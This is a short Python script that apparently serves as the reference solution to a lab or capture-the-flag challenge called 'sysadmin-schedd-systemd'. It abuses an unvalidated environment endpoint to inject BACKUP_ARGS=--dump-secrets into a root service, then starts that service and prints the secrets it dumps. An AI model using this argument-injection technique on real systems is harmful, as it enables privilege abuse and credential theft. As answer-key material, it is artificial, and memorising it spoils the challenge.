#!/usr/bin/env python3
"""Reference solver for sysadmin-schedd-systemd.

The unit's env drop-in accepts any key. Inject BACKUP_ARGS=--dump-secrets, then
start the root unit.

    python3 solve.py http://HOST:PORT
"""
import json
import sys
import urllib.request


def _req(url, obj=None, method="GET"):
    data = json.dumps(obj).encode() if obj is not None else None
    headers = {"Content-Type": "application/json"} if data else {}
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    return json.loads(urllib.request.urlopen(req, timeout=10).read())


def solve(base):
    base = base.rstrip("/")
    _req(base + "/set-env", {"key": "BACKUP_ARGS", "value": "--dump-secrets"}, "POST")
    return _req(base + "/start")["output"]


if __name__ == "__main__":
    if len(sys.argv) != 2:
        raise SystemExit("usage: solve.py http://HOST:PORT")
    print(solve(sys.argv[1]))
